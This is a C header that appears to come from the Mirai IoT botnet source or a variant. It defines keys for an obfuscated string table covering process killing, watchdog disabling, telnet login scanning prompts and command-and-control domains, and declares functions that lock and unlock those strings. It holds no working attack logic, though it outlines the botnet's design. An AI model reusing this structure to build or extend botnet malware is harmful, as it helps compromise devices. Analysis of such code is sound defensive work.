#pragma once

#include <stdint.h>
#include "includes.h"

struct table_value
{
    char *val;
    uint16_t val_len;

    #ifdef DEBUG
        BOOL locked;
    #endif
};

#define TABLE_EXEC_SUCCESS 1
#define TABLE_KILLER_PROC 2
#define TABLE_KILLER_EXE 3
#define TABLE_KILLER_FD 4
#define TABLE_KILLER_TCP 5
#define TABLE_KILLER_STATUS 6
#define TABLE_KILLER_CMDLINE 7
#define TABLE_KILLER_TMP 8
#define TABLE_KILLER_DATALOCAL 9
#define TABLE_KILLER_QTX 10
#define TABLE_KILLER_DOT 11
#define TABLE_KILLER_ARM 12
#define TABLE_KILLER_X86 13
#define TABLE_KILLER_SH4 14
#define TABLE_KILLER_MIPS 15
#define TABLE_KILLER_MPSL 16
#define TABLE_KILLER_SDA 17
#define TABLE_KILLER_MTD 18
#define TABLE_WATCHDOG_1 19
#define TABLE_WATCHDOG_2 20
#define TABLE_WATCHDOG_3 21
#define TABLE_WATCHDOG_4 22
#define TABLE_WATCHDOG_5 23
#define TABLE_WATCHDOG_6 24
#define TABLE_WATCHDOG_7 25
#define TABLE_WATCHDOG_8 26
#define TABLE_WATCHDOG_9 27
#define TABLE_RANDOM 28
#define TABLE_SCAN_SHELL 29
#define TABLE_SCAN_ENABLE 30
#define TABLE_SCAN_SYSTEM 31
#define TABLE_SCAN_SH 32
#define TABLE_SCAN_LSHELL 33
#define TABLE_SCAN_QUERY 34
#define TABLE_SCAN_RESP 35
#define TABLE_SCAN_NCORRECT 36
#define TABLE_SCAN_ASSWORD 37
#define TABLE_SCAN_OGIN 38
#define TABLE_SCAN_ENTER 39
#define TABLE_CNC_DOMAIN 40
#define TABLE_SCAN_DOMAIN 41
#define TABLE_KILLER_MAPS 42
#define TABLE_KILLER_QTX2 43
#define TABLE_KILLER_HAKAI 44

#define TABLE_MAX_KEYS 45

void table_init(void);
void table_unlock_val(uint8_t);
void table_lock_val(uint8_t);
char *table_retrieve_val(int, int *);

static void add_entry(uint8_t, char *, int);
static void toggle_obf(uint8_t);
